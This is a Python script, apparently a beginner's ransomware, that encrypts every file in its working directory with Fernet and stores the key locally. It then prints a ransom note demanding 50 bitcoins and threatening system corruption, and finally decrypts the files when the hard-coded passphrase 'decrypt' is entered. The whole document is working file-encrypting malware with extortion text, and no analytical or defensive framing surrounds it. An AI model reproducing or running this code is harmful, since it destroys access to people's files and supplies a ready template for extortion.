#say bye to your files
import os
from cryptography.fernet import Fernet


files = []
for file in os.listdir():
    if file in ["encrypt.py", "decrypt.py", "thekey.key", "Malware.py", "combined.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)



key = Fernet.generate_key()

with open("thekey.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(encrypted)
        print(f"[+] Encrypted: {file}")
    except Exception as e:
        print(f"[!] Failed to encrypt {file}: {str(e)}")

# KEEPS WINDOW OPEN
print("\n[!]All your files have been encrypted!")
print("\n[!]Send me 50 bitcoins on (BTC).Encrypt.com or your system will self corrupt")
input("Press Enter to Decrypt files...")

from cryptography.fernet import Fernet

# Get the directory where the script is located
script_dir = os.path.dirname(os.path.abspath(__file__))
key_path = os.path.join(script_dir, "thekey.key")

files = []
for file in os.listdir(script_dir):
    if file in ["Malware.py", "decrypt.py", "thekey.key"]:
        continue
    if os.path.isfile(os.path.join(script_dir, file)):
        files.append(file)

print("[!] Files to decrypt:", files)

secret_phrase = "decrypt"
user_input = input("Enter decryption passphrase: ")

if user_input == secret_phrase:
    try:
        if not os.path.exists(key_path):
            raise FileNotFoundError(f"thekey.key not found at {key_path}")
            
        with open(key_path, "rb") as key_file:
            key = key_file.read()
            
        try:
            Fernet(key)
        except ValueError as e:
            raise ValueError(f"Invalid Fernet key: {str(e)}")
        
        for file in files:
            file_path = os.path.join(script_dir, file)
            try:
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                decrypted = Fernet(key).decrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(decrypted)
                print(f"[+] Decrypted: {file}")
            except Exception as e:
                print(f"[!] Failed to decrypt {file}: {str(e)}")
        
        print("\n[+] Decryption successful!")
    except Exception as e:
        print(f"[!] Critical Error: {str(e)}")
else:
    print("[!] Wrong passphrase!")

input("Press Enter to exit...")